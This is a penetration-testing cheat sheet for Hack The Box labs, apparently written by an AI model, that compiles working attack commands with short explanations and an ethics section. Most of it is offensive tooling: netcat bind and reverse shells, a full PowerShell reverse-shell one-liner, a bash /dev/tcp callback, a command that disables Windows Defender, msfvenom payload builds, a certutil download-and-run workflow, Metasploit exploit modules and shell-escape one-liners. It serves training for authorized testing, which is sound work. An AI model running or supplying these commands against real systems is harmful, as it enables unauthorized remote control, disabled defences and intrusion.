
# HTB Command Cheat Sheet — Expanded & Organized

**Purpose:** A tidy, teach-first reference for common command-line snippets used in red-team / penetration testing labs (Hack The Box). **Always** run these commands only in environments you own or have explicit permission to test (labs, CTFs, employer-authorized engagements). See the **Ethics & Safety** section below.

---

## Table of Contents
1. [Quick usage notes & conventions](#quick-usage-notes--conventions)  
2. [Remote Desktop Protocol (RDP)](#remote-desktop-protocol-rdp)  
3. [Environment / shell discovery](#environment--shell-discovery)  
4. [Netcat (nc) — bind & reverse shells](#netcat-nc---bind--reverse-shells)  
5. [Common reverse-shell one-liners](#common-reverse-shell-one-liners)  
6. [Windows-focused commands (PowerShell & Defender)](#windows-focused-commands-powershell--defender)  
7. [Metasploit / msfvenom snippets](#metasploit--msfvenom-snippets)  
8. [Privilege escalation & system shell helpers](#privilege-escalation--system-shell-helpers)  
9. [Spawn interactive shells (Unix)](#spawn-interactive-shells-unix)  
10. [File system and discovery helpers](#file-system-and-discovery-helpers)  
11. [Web shells & common webshell locations](#web-shells--common-webshell-locations)  
12. [Sudo enumeration](#sudo-enumeration)  
13. [Examples & mini-workflows](#examples--mini-workflows)  
14. [Ethics & Safety — Required reading](#ethics--safety---required-reading)  
15. [Appendix — Original command table (preserved)](#appendix---original-command-table-preserved)

---

## Quick usage notes & conventions
- `<>` indicates a placeholder you must replace (e.g., `<port #>`). Do **not** type the angle brackets themselves.  
- `HTB` = Hack The Box.  
- `RDP` = Remote Desktop Protocol.  
- Commands shown may be **dangerous** (open shells, disable protection). Use in authorized labs only.  
- When copying/pasting long one-liners (especially PowerShell), be careful with shell quoting (`'` vs `"`). If a one-liner fails, consider saving it into a file and executing the file instead.

---

## Remote Desktop Protocol (RDP)
### `xfreerdp` (CLI RDP client)
- Command:
  ```
  xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!
  ```
- Explanation:
  - `xfreerdp` is an open-source RDP client for Unix-like systems (FreeRDP).  
  - `/v:` specifies the target host or IP.  
  - `/u:` and `/p:` are username and password.  
- Example (with domain):
  ```
  xfreerdp /v:10.129.10.5 /u:DOMAIN\\user /p:'P@ssw0rd!' /cert-ignore
  ```
- Tip: Use `/cert-ignore` when the server certificate is self-signed to avoid connection prompts in automated scripts.

---

## Environment / shell discovery
### `env`
- Purpose: dump the environment variables visible to the current user. Useful to detect shells, PATH, proxies, and common environment indicators.
- Usage:
  ```
  env
  ```
- Teaching tip: `echo $SHELL` often tells you the current interactive shell (e.g., `/bin/bash`, `/bin/sh`). On Windows PowerShell, `echo $env:USERNAME` shows a Windows environment variable.

---

## Netcat (`nc`) — bind & reverse shells
`netcat` is a simple TCP/UDP connection tool. There are multiple implementations; behavior differs slightly between `netcat-traditional`, `ncat` (Nmap), and `openbsd-netcat`.

### Start a listener (attacker box)
```
sudo nc -lvnp <port #>
```
- `-l` listen, `-v` verbose, `-n` numeric-only (no DNS), `-p` port.

### Connect to a listener (target)
```
nc -nv <attacker-ip> <port>
```
- Example:
  ```
  nc -nv 10.10.14.113 4444
  ```

### Bind a shell to an IP:port (on target)
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
- What it does:
  - Creates a named pipe `/tmp/f` (`mkfifo`).
  - Pipes that into an interactive `bash` and forwards input/output over a `nc` listener on `10.129.41.200:7777`.
- Caveat: Some `nc` builds require `-p` for bind port or behave differently—adjust for your environment.

---

## Common reverse-shell one-liners
### PowerShell (Windows) reverse shell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Explanation:
  - `-nop` = No profile (don’t load PowerShell profile).
  - The script creates a TCP client, reads commands from the socket, executes them (`iex` = Invoke-Expression), and returns output.

### Example UNIX reverse shell (bash)
```
bash -i >& /dev/tcp/10.10.14.113/443 0>&1
```
- Works on many Linux systems with `/dev/tcp` support.

---

## Windows-focused commands (PowerShell & Defender)
### Disable Windows Defender real-time monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
- `Set-MpPreference` is part of Windows Defender (Microsoft Defender Antivirus) cmdlets.  
- **Important:** Disabling real-time protection is typically blocked by system policies or requires elevated privileges (administrator). Using this outside authorized testing is unethical and illegal.

---

## Metasploit / msfvenom snippets
- `use exploit/windows/smb/psexec`
  - Metasploit module that leverages SMB + PsExec technique to execute commands on Windows hosts when valid credentials or token is available.

- `use auxiliary/scanner/smb/smb_ms17_010`
  - Scanner module to check MS17-010 (EternalBlue) vulnerability.

- Generating payloads with `msfvenom`:
  - Linux ELF reverse shell:
    ```
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf
    ```
  - Windows EXE reverse shell:
    ```
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
    ```
  - macOS Mach-O reverse shell:
    ```
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho
    ```
  - ASP web payload:
    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp
    ```
  - JSP web payload (raw):
    ```
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp
    ```
  - WAR (Java webapp):
    ```
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war
    ```

---

## Privilege escalation & system shell helpers
### `shell`
- In a Meterpreter session (Metasploit), `shell` drops you into a real system shell (CMD on Windows, or underlying shell on Unix).

### `sudo -l`
- Enumerates commands the current user can run with `sudo` (superuser do).
- Usage:
  ```
  sudo -l
  ```
- Teaching tip: If `sudo -l` shows a NOPASSWD entry for a script/binary you can control, this is a direct privilege escalation path.

---

## Spawn interactive shells (Unix)
Many interpreters can spawn a proper interactive shell to support job control and better terminal behavior.

- Python:
  ```
  python -c 'import pty; pty.spawn("/bin/sh")'
  ```
- `/bin/sh -i`
  - Spawn an interactive `sh`.
- Perl:
  ```
  perl -e 'exec "/bin/sh";'
  ```
- Ruby:
  ```
  ruby -e 'exec "/bin/sh"'
  ```
- Lua:
  ```
  lua -e "os.execute('/bin/sh')"
  ```
- AWK:
  ```
  awk 'BEGIN {system("/bin/sh")}'
  ```
- `find` driven spawn:
  ```
  find . -exec /bin/sh \; -quit
  ```
- Vim escape:
  ```
  vim -c ':!/bin/sh'
  ```
- Teaching tip: After obtaining a basic shell, always try to upgrade it to fully interactive (e.g., `python -c 'import pty; pty.spawn("/bin/bash")'`, then press `CTRL-Z` and run `stty raw -echo; fg` on your local terminal) to get job control and nicer terminal behavior.

---

## File system and discovery helpers
- `ls -la <path/to/fileorbinary>`
  - Lists files and shows permissions (useful for discovery and finding SUID/SGID binaries).
- `env` (repeated) — environment variables may reveal credentials, proxy settings, or paths.
- `find / -name <nameoffile> -type f 2>/dev/null`
  - Locate files across filesystem (filtered to remove permission errors).

---

## Web shells & common webshell locations
- Webshell repository paths (common pentesting lab locations on Parrot OS / Pwnbox):
  - `/usr/share/webshells/laudanum`
  - `/usr/share/nishang/Antak-WebShell`
- Teaching tip: If you upload web shells to exploit a file upload vulnerability, place them in a location reachable by the web server user (e.g., `/var/www/html/` on many setups), then fetch via `http://target/your-shell`.

---

## Sudo enumeration
- Always run `sudo -l` to identify misconfigurations.
- If you find a command that can be run as root without a password, research whether that binary/script can be abused (path hijacking, writable config, etc.).
- Use `GTFOBins` (https://gtfobins.github.io/) as a resource for how to escalate via allowed sudo commands.

---

## Examples & mini-workflows
### Example 1 — Quick reverse shell from a Windows host to your listener
1. Start a listener on your attack box:
   ```
   sudo nc -lvnp 443
   ```
2. On the Windows target (PowerShell):
   ```
   powershell -nop -c "<the one-liner shown in this sheet>"
   ```
3. You will receive a remote shell — be mindful of encoding/quoting issues when pasting long PowerShell one-liners.

### Example 2 — Deliver an MSF payload and catch it
1. Generate a payload with `msfvenom`:
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=4444 -f exe > evil.exe
   ```
2. Host it (Python simple HTTP server):
   ```
   python3 -m http.server 8000
   ```
3. On target download & run:
   ```
   certutil -urlcache -f "http://10.10.14.113:8000/evil.exe" evil.exe
   evil.exe
   ```
4. In Metasploit, set up a matching handler:
   ```
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 10.10.14.113
   set LPORT 4444
   run
   ```

---

## Ethics & Safety — Required reading
- **Only use these commands where you have explicit authorization** (personal lab VM, CTF, employer-sanctioned pentest).  
- Unauthorized access, account compromise, or disabling security controls on computers you do not own is illegal and unethical.  
- If you are practicing: document scope, take notes, and restore any changes you made (or use throwaway VMs).

---

## Appendix — Original command table (preserved)
> The original table content is kept below verbatim for copy/paste fidelity.

|**Commands** |**Description**|
|---|---|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use |
| `sudo nc -lvnp <port #>` | Starts a `netcat` listener on a specified port |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Connects to a netcat listener at the specified IP address and port |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Powershell command using to disable real time monitoring in `Windows Defender` |
| `use exploit/windows/smb/psexec` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |
| `shell` | Command used in a meterpreter shell session to drop into a `system shell` |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload` |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | MSFvenom command used to generate a Windows-based reverse shell stageless payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | MSFvenom command used to generate a MacOS-based reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | MSFvenom command used to generate a JSP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |
| `use auxiliary/scanner/smb/smb_ms17_010` | Metasploit exploit module used to check if a host is vulnerable to `ms17_010` |
| `use exploit/windows/smb/ms17_010_psexec` | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010 |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6` |
| `python -c 'import pty; pty.spawn("/bin/sh")'` | Python command used to spawn an `interactive shell` on a linux-based system |
| `/bin/sh -i` | Spawns an interactive shell on a linux-based system |
| `perl —e 'exec "/bin/sh";'` | Uses `perl` to spawn an interactive shell on a linux-based system |
| `ruby: exec "/bin/sh"` | Uses `ruby` to spawn an interactive shell on a linux-based system |
| `Lua: os.execute('/bin/sh')` | Uses `Lua` to spawn an interactive shell on a linux-based system |
| `awk 'BEGIN {system("/bin/sh")}'` | Uses `awk` command to spawn an interactive shell on a linux-based system |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Uses `find` command to spawn an interactive shell on a linux-based system |
| `find . -exec /bin/sh \; -quit` | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system |
| `vim -c ':!/bin/sh'` | Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells" |
| `ls -la <path/to/fileorbinary>` | Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute |
| `sudo -l` | Displays the commands that the currently logged on user can run as `sudo` |
| `/usr/share/webshells/laudanum` | Location of `laudanum webshells` on ParrotOS and Pwnbox |
| `/usr/share/nishang/Antak-WebShell` | Location of `Antak-Webshell` on Parrot OS and Pwnbox |

---

## If you want edits
Tell me:
- Which sections to expand or remove  
- Any preferred formatting (compact vs verbose)  
- If you want an alternate output format (HTML, PDF, or a downloadable `.md` only)

